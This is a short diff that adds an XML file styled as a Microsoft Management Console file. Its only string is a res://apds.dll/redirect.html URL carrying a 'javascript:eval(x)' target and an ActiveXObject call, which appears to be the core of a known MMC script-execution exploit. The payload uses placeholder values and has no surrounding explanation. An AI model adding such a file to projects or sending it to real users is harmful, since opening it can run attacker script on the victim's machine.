@@ -1,0 +1,2 @@
+<?xml version="1.0"?><ConsoleFile><StringTables><String>res://apds.dll/redirect.html?target=javascript:eval(x); new ActiveXObject("X")</String></StringTables></ConsoleFile>
+
